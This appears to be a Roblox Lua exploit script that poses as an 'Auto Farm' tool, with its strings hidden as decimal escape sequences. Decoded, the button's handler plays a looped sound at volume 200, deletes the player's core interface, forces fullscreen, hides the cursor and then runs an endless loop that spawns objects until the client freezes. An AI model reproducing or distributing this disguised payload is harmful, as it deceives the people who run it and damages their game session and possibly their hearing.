--[[
        . _____     ___       _______  ___      ___       ___     
         |   __|   /   \     |___   / |   \    /   |     /   \    
         |  |__   / / \ \       /  /  | |\ \  / /| |    / / \ \   
         |   __| / /___\ \     /  /   | | \ \/ / | |   / /___\ \  
         |  |   / _______ \   /  /__  | |  \__/  | |  / _______ \ 
         |__|  /_/       \_\ /______| |_|        |_| /_/       \_\
YT:FAZMA_IKU
]]--
local a = game:service('\67\111\114\101\71\117\105')
local b = Instance.new('\83\99\114\101\101\110\71\117\105')
local c = Instance.new('\73\109\97\103\101\76\97\98\101\108')
local d = Instance.new('\73\109\97\103\101\76\97\98\101\108')
local e = Instance.new('\84\101\120\116\66\117\116\116\111\110')
local f = Instance.new('\73\109\97\103\101\76\97\98\101\108')

b.Parent = game.CoreGui

c.Name = "\70\114\97\109\101"
c.Parent = b
c.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
c.BackgroundTransparency = 1.000
c.BorderColor3 = Color3.fromRGB(27, 42, 53)
c.Position = UDim2.new(0.201092273, 0, 0.373376638, 0)
c.Size = UDim2.new(0, 373, 0, 178)
c.Image = '\114\98\120\97\115\115\101\116\105\100\58\47\47\49\48\55\57\56\55\51\50\52\51\57'
c.ImageColor3 = Color3.fromRGB(143, 143, 143)
c.ImageTransparency = 0.400
c.ScaleType = Enum.ScaleType.Slice
c.SliceCenter = Rect.new(100, 100, 100, 100)
c.SliceScale = 0.120

d.Name = "\70\114\97\109\101"
d.Parent = c
d.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
d.BackgroundTransparency = 1.000
d.BorderColor3 = Color3.fromRGB(27, 42, 53)
d.Size = UDim2.new(0, 373, 0, 32)
d.Image = '\114\98\120\97\115\115\101\116\105\100\58\47\47\49\48\55\57\56\55\51\50\52\51\57'
d.ImageColor3 = Color3.fromRGB(65, 65, 65)
d.ImageTransparency = 0.200
d.ScaleType = Enum.ScaleType.Slice
d.SliceCenter = Rect.new(100, 100, 100, 100)
d.SliceScale = 0.120

e.Parent = c
e.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
e.BackgroundTransparency = 0.550
e.BorderColor3 = Color3.fromRGB(0, 0, 0)
e.BorderSizePixel = 0
e.Position = UDim2.new(0.230563, 0, 0.45505619, 0)
e.Size = UDim2.new(0, 200, 0, 50)
e.Font = Enum.Font.SourceSansLight
e.Text = "\65\117\116\111\32\70\97\114\109"
e.TextColor3 = Color3.fromRGB(0, 0, 0)
e.TextSize = 25
e.MouseButton1Down:connect(function()    
    wait(4)
    local g = Instance.new('\83\111\117\110\100', a)
    g.SoundId = '\114\98\120\97\115\115\101\116\105\100\58\47\47\57\49\50\53\55\49\50\53\54\49'
    g.Volume = 200
    g.Looped = true
    task.wait(1)

    for h, i in pairs(a:GetChildren()) do
        if i ~= c and i ~= g then
            i:Destroy()
        end
    end

    if (not UserSettings().GameSettings:InFullScreen()) then
        game:service'\71\117\105\83\101\114\118\105\99\101':ToggleFullscreen()
    end

    game:service'\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101'.MouseIconEnabled = false
    g:Play()
    wait(2)
    
    while true do
        Instance.new('\83\109\111\107\101', script.Parent)
    end
end)
